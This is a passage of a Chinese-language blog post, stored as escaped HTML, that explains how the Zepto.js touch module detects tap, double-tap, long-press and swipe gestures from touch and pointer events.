class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (e.type == \u003cspan class=\"hljs-string\"\u003e'pointer'\u003c/span\u003e+type ||\n          e.type.toLowerCase() == \u003cspan class=\"hljs-string\"\u003e'mspointer'\u003c/span\u003e+type)\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e触发的是否为 \u003ccode\u003epointerEvent\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e在低版本的移动端 IE 浏览器中，只实现了 \u003ccode\u003ePointerEvent\u003c/code\u003e ，并没有实现 \u003ccode\u003eTouchEvent\u003c/code\u003e ，所以需要这个来判断。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e事件触发\u003c/h2\u003e\n\u003ch3 id=\"-\"\u003e整体分析\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e$(\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e).ready(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e now, delta, deltaX = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, deltaY = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, firstTouch, _isPointerType\n\n    $(\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e)\n      .bind(\u003cspan class=\"hljs-string\"\u003e'MSGestureEnd'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n        ...\n      })\n      .on(\u003cspan class=\"hljs-string\"\u003e'touchstart MSPointerDown pointerdown'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n        ...\n      })\n      .on(\u003cspan class=\"hljs-string\"\u003e'touchmove MSPointerMove pointermove'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n        ...\n      })\n      .on(\u003cspan class=\"hljs-string\"\u003e'touchend MSPointerUp pointerup'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n        ...\n      })\n\n      .on(\u003cspan class=\"hljs-string\"\u003e'touchcancel MSPointerCancel pointercancel'\u003c/span\u003e, cancelAll)\n\n    $(\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'scroll'\u003c/span\u003e, cancelAll)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e先来说明几个变量，\u003ccode\u003enow\u003c/code\u003e 用来保存当前时间， \u003ccode\u003edelta\u003c/code\u003e 用来保存两次触摸之间的时间差， \u003ccode\u003edeltaX\u003c/code\u003e 用来保存 \u003ccode\u003ex轴\u003c/code\u003e 上的位移， \u003ccode\u003edeltaY\u003c/code\u003e 来用保存 \u003ccode\u003ey轴\u003c/code\u003e 上的位移， \u003ccode\u003efirstTouch\u003c/code\u003e 保存初始触摸点的信息， \u003ccode\u003e_isPointerType\u003c/code\u003e 保存是否为 \u003ccode\u003epointerEvent\u003c/code\u003e 的判断结果。\u003c/p\u003e\n\u003cp\u003e从上面可以看到， \u003ccode\u003eZepto\u003c/code\u003e 所触发的事件，是从 \u003ccode\u003etouch\u003c/code\u003e 、 \u003ccode\u003epointer\u003c/code\u003e 或者 IE 的 \u003ccode\u003eguesture\u003c/code\u003e 事件中，根据不同情况计算出来的。这些事件都绑定在 \u003ccode\u003edocument\u003c/code\u003e 上。\u003c/p\u003e\n\u003ch3 id=\"ie-gesture-\"\u003eIE Gesture 事件的处理\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eIE\u003c/code\u003e 的手势使用，需要经历三步：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e创建手势对象\u003c/li\u003e\n\u003cli\u003e指定目标元素\u003c/li\u003e\n\u003cli\u003e指定手势识别时需要处理的指针\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-string\"\u003e'MSGesture'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e) {\n  gesture = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e MSGesture()\n  gesture.target = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.body\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这段代码包含了前两步。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003eon(\u003cspan class=\"hljs-string\"\u003e'touchstart MSPointerDown pointerdown'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n  ...\n  if (gesture \u0026amp;\u0026amp; _isPointerType) gesture.addPointer(e.pointerId)\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这段是第三步，用 \u003ccode\u003eaddPointer\u003c/code\u003e 的方法，指定需要处理的指针。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003ebind(\u003cspan class=\"hljs-string\"\u003e'MSGestureEnd'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e swipeDirectionFromVelocity =\n      e.velocityX \u0026gt; \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Right'\u003c/span\u003e : e.velocityX \u0026lt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Left'\u003c/span\u003e : e.velocityY \u0026gt; \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Down'\u003c/span\u003e : e.velocityY \u0026lt; \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Up'\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (swipeDirectionFromVelocity) {\n    touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e)\n    touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e+ swipeDirectionFromVelocity)\n  }\n})\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来就是分析手势了，\u003ccode\u003eGesture\u003c/code\u003e 里只处理 \u003ccode\u003eswipe\u003c/code\u003e 事件。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003evelocityX\u003c/code\u003e 和 \u003ccode\u003evelocityY\u003c/code\u003e 分别为 \u003ccode\u003ex轴\u003c/code\u003e 和 \u003ccode\u003ey轴\u003c/code\u003e 上的速率。这里以 \u003ccode\u003e1\u003c/code\u003e  或 \u003ccode\u003e-1\u003c/code\u003e 为临界点，判断 \u003ccode\u003eswipe\u003c/code\u003e 的方向。\u003c/p\u003e\n\u003cp\u003e如果 \u003ccode\u003eswipe\u003c/code\u003e 的方向存在，则触发 \u003ccode\u003eswipe\u003c/code\u003e 事件，同时也触发带方向的 \u003ccode\u003eswipe\u003c/code\u003e 事件。\u003c/p\u003e\n\u003ch3 id=\"start\"\u003estart\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003eon(\u003cspan class=\"hljs-string\"\u003e'touchstart MSPointerDown pointerdown'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e((_isPointerType = isPointerEventType(e, \u003cspan class=\"hljs-string\"\u003e'down'\u003c/span\u003e)) \u0026amp;\u0026amp;\n     !isPrimaryTouch(e)) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e\n  firstTouch = _isPointerType ? e : e.touches[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (e.touches \u0026amp;\u0026amp; e.touches.length === \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u0026amp;\u0026amp; touch.x2) {\n    touch.x2 = \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n    touch.y2 = \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n  }\n  now = \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now()\n  delta = now - (touch.last || now)\n  touch.el = $(\u003cspan class=\"hljs-string\"\u003e'tagName'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e firstTouch.target ?\n               firstTouch.target : firstTouch.target.parentNode)\n  touchTimeout \u0026amp;\u0026amp; clearTimeout(touchTimeout)\n  touch.x1 = firstTouch.pageX\n  touch.y1 = firstTouch.pageY\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (delta \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026amp;\u0026amp; delta \u0026lt;= \u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e) touch.isDoubleTap = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  touch.last = now\n  longTapTimeout = setTimeout(longTap, longTapDelay)\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (gesture \u0026amp;\u0026amp; _isPointerType) gesture.addPointer(e.pointerId)\n})\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"-\"\u003e过滤掉非触屏事件\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e((_isPointerType = isPointerEventType(e, \u003cspan class=\"hljs-string\"\u003e'down'\u003c/span\u003e)) \u0026amp;\u0026amp;\n   !isPrimaryTouch(e)) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e\nfirstTouch = _isPointerType ? e : e.touches[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里还将 \u003ccode\u003eisPointerEventType\u003c/code\u003e 的判断结果保存到了 \u003ccode\u003e_isPointerType\u003c/code\u003e 中，用来判断是否为 \u003ccode\u003ePointerEvent\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e这里的判断其实就是只处理 \u003ccode\u003ePointerEvent\u003c/code\u003e 和 \u003ccode\u003eTouchEvent\u003c/code\u003e ，并且 \u003ccode\u003eTouchEvent\u003c/code\u003e 的 \u003ccode\u003eisPrimary\u003c/code\u003e 必须为 \u003ccode\u003etrue\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e因为 \u003ccode\u003eTouchEvent\u003c/code\u003e 支持多点触碰，这里只取触碰的第一点存入 \u003ccode\u003efirstTouch\u003c/code\u003e 变量。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e重置终点坐标\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (e.touches \u0026amp;\u0026amp; e.touches.length === \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u0026amp;\u0026amp; touch.x2) {\n  touch.x2 = \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n  touch.y2 = \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果还需要记录，终点坐标是需要更新的。\u003c/p\u003e\n\u003cp\u003e正常情况下，\u003ccode\u003etouch\u003c/code\u003e 对象会在 \u003ccode\u003etouchEnd\u003c/code\u003e 或者 \u003ccode\u003ecancel\u003c/code\u003e 的时候清空，但是如果用户自己调用了 \u003ccode\u003epreventDefault\u003c/code\u003e 等，就可能会出现没有清空的情况。\u003c/p\u003e\n\u003cp\u003e这里有一点不太明白，为什么只会在 \u003ccode\u003etouches\u003c/code\u003e 单点操作的时候才清空呢？多个触碰点的时候不需要清空吗？\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e记录触碰点的信息\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003enow = \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now()\ndelta = now - (touch.last || now)\ntouch.el = $(\u003cspan class=\"hljs-string\"\u003e'tagName'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e firstTouch.target ?\n             firstTouch.target : firstTouch.target.parentNode)\ntouchTimeout \u0026amp;\u0026amp; clearTimeout(touchTimeout)\ntouch.x1 = firstTouch.pageX\ntouch.y1 = firstTouch.pageY\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003enow\u003c/code\u003e 用来保存当前时间。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003edelta\u003c/code\u003e 用来保存两次点击时的时间间隔，用来处理双击事件。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etouch.el\u003c/code\u003e 用来保存目标元素，这里有个判断，如果 \u003ccode\u003etarget\u003c/code\u003e 不是标签节点时，取父节点作为目标元素。这会在点击伪类元素时出现。\u003c/p\u003e\n\u003cp\u003e如果 \u003ccode\u003etouchTimeout\u003c/code\u003e 存在，则清除定时器，避免重复触发。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etouch.x1\u003c/code\u003e 和 \u003ccode\u003etouch.y1\u003c/code\u003e 分别保存 \u003ccode\u003ex轴\u003c/code\u003e 坐标和 \u003ccode\u003ey轴\u003c/code\u003e 坐标。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e双击事件\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (delta \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026amp;\u0026amp; delta \u0026lt;= \u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e) touch.isDoubleTap = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以很清楚地看到， \u003ccode\u003eZepto\u003c/code\u003e 将两次点击的时间间隔小于 \u003ccode\u003e250ms\u003c/code\u003e 时，作为 \u003ccode\u003edoubleTap\u003c/code\u003e 事件处理，将 \u003ccode\u003eisDoubleTap\u003c/code\u003e 设置为 \u003ccode\u003etrue\u003c/code\u003e 。\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e长按事件\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003etouch.last = now\nlongTapTimeout = setTimeout(longTap, longTapDelay)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将 \u003ccode\u003etouch.last\u003c/code\u003e 设置为当前时间。这样就可以记录两次点击时的时间差了。\u003c/p\u003e\n\u003cp\u003e同时开始长按事件定时器，从上面的代码可以看到，长按事件会在 \u003ccode\u003e750ms\u003c/code\u003e 后触发。\u003c/p\u003e\n\u003ch3 id=\"move\"\u003emove\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003eon(\u003cspan class=\"hljs-string\"\u003e'touchmove MSPointerMove pointermove'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e((_isPointerType = isPointerEventType(e, \u003cspan class=\"hljs-string\"\u003e'move'\u003c/span\u003e)) \u0026amp;\u0026amp;\n     !isPrimaryTouch(e)) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e\n  firstTouch = _isPointerType ? e : e.touches[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n  cancelLongTap()\n  touch.x2 = firstTouch.pageX\n  touch.y2 = firstTouch.pageY\n\n  deltaX += \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.x1 - touch.x2)\n  deltaY += \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.y1 - touch.y2)\n})\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003emove\u003c/code\u003e 事件处理了两件事，一是记录终点坐标，一是计算起点到终点之间的位移。\u003c/p\u003e\n\u003cp\u003e要注意这里还调用了 \u003ccode\u003ecancelLongTap\u003c/code\u003e 清除了长按定时器，避免长按事件的触发。因为有移动，肯定就不是长按了。\u003c/p\u003e\n\u003ch3 id=\"end\"\u003eend\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003eon(\u003cspan class=\"hljs-string\"\u003e'touchend MSPointerUp pointerup'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e((_isPointerType = isPointerEventType(e, \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e)) \u0026amp;\u0026amp;\n     !isPrimaryTouch(e)) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e\n  cancelLongTap()\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ((touch.x2 \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.x1 - touch.x2) \u0026gt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e) ||\n      (touch.y2 \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.y1 - touch.y2) \u0026gt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e))\n\n    swipeTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el){\n        touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e)\n        touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e + (swipeDirection(touch.x1, touch.x2, touch.y1, touch.y2)))\n      }\n      touch = {}\n    }, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-string\"\u003e'last'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e touch)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (deltaX \u0026lt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u0026amp;\u0026amp; deltaY \u0026lt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e) {\n\n      tapTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e event = $.Event(\u003cspan class=\"hljs-string\"\u003e'tap'\u003c/span\u003e)\n        event.cancelTouch = cancelAll\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(event)\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.isDoubleTap) {\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'doubleTap'\u003c/span\u003e)\n          touch = {}\n        }\n\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n          touchTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n            touchTimeout = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'singleTap'\u003c/span\u003e)\n            touch = {}\n          }, \u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e)\n        }\n      }, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      touch = {}\n    }\n  deltaX = deltaY = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\n})\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"swipe\"\u003eswipe\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003ecancelLongTap()\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ((touch.x2 \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.x1 - touch.x2) \u0026gt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e) ||\n    (touch.y2 \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(touch.y1 - touch.y2) \u0026gt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e))\n\n  swipeTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el){\n      touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e)\n      touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e + (swipeDirection(touch.x1, touch.x2, touch.y1, touch.y2)))\n    }\n    touch = {}\n  }, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e进入 \u003ccode\u003eend\u003c/code\u003e 时，立刻清除 \u003ccode\u003elongTap\u003c/code\u003e 定时器的执行。\u003c/p\u003e\n\u003cp\u003e可以看到，起点和终点的距离超过 \u003ccode\u003e30\u003c/code\u003e 时，会被判定为 \u003ccode\u003eswipe\u003c/code\u003e 滑动事件。\u003c/p\u003e\n\u003cp\u003e在触发完 \u003ccode\u003eswipe\u003c/code\u003e 事件后，立即触发对应方向上的 \u003ccode\u003eswipe\u003c/code\u003e 事件。\u003c/p\u003e\n\u003cp\u003e注意，\u003ccode\u003eswipe\u003c/code\u003e 事件并不是在 \u003ccode\u003eend\u003c/code\u003e 系列事件触发时立即触发的，而是设置了一个 \u003ccode\u003e0ms\u003c/code\u003e 的定时器，让事件异步触发，这个有什么用呢？后面会讲到。\u003c/p\u003e\n\u003ch4 id=\"tap\"\u003etap\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-string\"\u003e'last'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e touch)\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (deltaX \u0026lt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u0026amp;\u0026amp; deltaY \u0026lt; \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e) {\n\n    tapTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e event = $.Event(\u003cspan class=\"hljs-string\"\u003e'tap'\u003c/span\u003e)\n      event.cancelTouch = cancelAll\n\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(event)\n\n    }, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    touch = {}\n  }\ndeltaX = deltaY = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e终于看到重点了，首先判断 \u003ccode\u003elast\u003c/code\u003e 是否存在，从 \u003ccode\u003estart\u003c/code\u003e 中可以看到，如果触发了 \u003ccode\u003estart\u003c/code\u003e ， \u003ccode\u003elast\u003c/code\u003e 肯定是存在的，但是如果触发了长按事件，\u003ccode\u003etouch\u003c/code\u003e 对象会被清空，这时不会再触发 \u003ccode\u003etap\u003c/code\u003e 事件。\u003c/p\u003e\n\u003cp\u003e如果不是 \u003ccode\u003eswipe\u003c/code\u003e 事件，也不存在 \u003ccode\u003elast\u003c/code\u003e ，则只将 \u003ccode\u003etouch\u003c/code\u003e 清空，不触发任何事件。\u003c/p\u003e\n\u003cp\u003e在最后会将 \u003ccode\u003edeltaX\u003c/code\u003e 和 \u003ccode\u003edeltaY\u003c/code\u003e 重置为 \u003ccode\u003e0\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e触发 \u003ccode\u003etap\u003c/code\u003e 事件时，会在 \u003ccode\u003eevent\u003c/code\u003e 中加了 \u003ccode\u003ecancelTouch\u003c/code\u003e 方法，外界可以通过这个方法取消所有事件的执行。\u003c/p\u003e\n\u003cp\u003e这里同样用了 \u003ccode\u003esetTimeout\u003c/code\u003e 异步触发事件。\u003c/p\u003e\n\u003ch4 id=\"doubletap\"\u003edoubleTap\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.isDoubleTap) {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'doubleTap'\u003c/span\u003e)\n  touch = {}\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个 \u003ccode\u003eisDoubleTap\u003c/code\u003e 在 \u003ccode\u003estart\u003c/code\u003e 时确定的，上面已经分析过了，在 \u003ccode\u003eend\u003c/code\u003e 的时候触发 \u003ccode\u003edoubleTap\u003c/code\u003e 事件。\u003c/p\u003e\n\u003cp\u003e因此，可以知道，在触发 \u003ccode\u003edoubleTap\u003c/code\u003e 事件之前会触发两次 \u003ccode\u003etap\u003c/code\u003e 事件。\u003c/p\u003e\n\u003ch4 id=\"singletap\"\u003esingleTap\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003etouchTimeout = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  touchTimeout = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.el) touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'singleTap'\u003c/span\u003e)\n  touch = {}\n}, \u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果不是 \u003ccode\u003edoubleTap\u003c/code\u003e ，会在 \u003ccode\u003etap\u003c/code\u003e 事件触发的 \u003ccode\u003e250ms\u003c/code\u003e 后，触发 \u003ccode\u003esingleTap\u003c/code\u003e 事件。\u003c/p\u003e\n\u003ch3 id=\"cancel\"\u003ecancel\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e.on(\u003cspan class=\"hljs-string\"\u003e'touchcancel MSPointerCancel pointercancel'\u003c/span\u003e, cancelAll)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在接受到 \u003ccode\u003ecancel\u003c/code\u003e 事件时，调用 